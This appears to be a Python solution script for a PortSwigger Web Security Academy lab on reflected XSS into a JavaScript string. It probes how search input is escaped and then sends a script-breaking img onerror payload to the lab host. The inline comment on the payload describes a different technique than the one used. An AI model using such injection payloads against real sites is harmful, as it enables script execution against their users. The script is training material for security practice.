# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

import requests


base = "https://0a4f00d704de628b836a5a49006700d5.web-security-academy.net"
s = requests.Session()
PAYLOAD = "</script><img src=1 onerror=alert(1)>"   # close the JS string with ', end the statement with ;, the leftover ' pairs into ''

print("===========[step1] Check where input lands on the search page===============")
r = s.get(f"{base}", params={"search": "abc123"})
# print(r.text)
'''
                   <script>
                        var searchTerms = 'abc123';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
'''
'''
when i input below on searchbox:
abc123'"<>()/\

returns below:

request:
GET /?search=abc123%27%22%3C%3E%28%29%2F%5C HTTP/2

response:
                    <script>
                        var searchTerms = 'abc123\'"<>()/\\';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    
                    </script>
'''

print("===========[step2] Check if the payload is reflected in the server response===============")
r = s.get(f"{base}", params={"search": PAYLOAD})
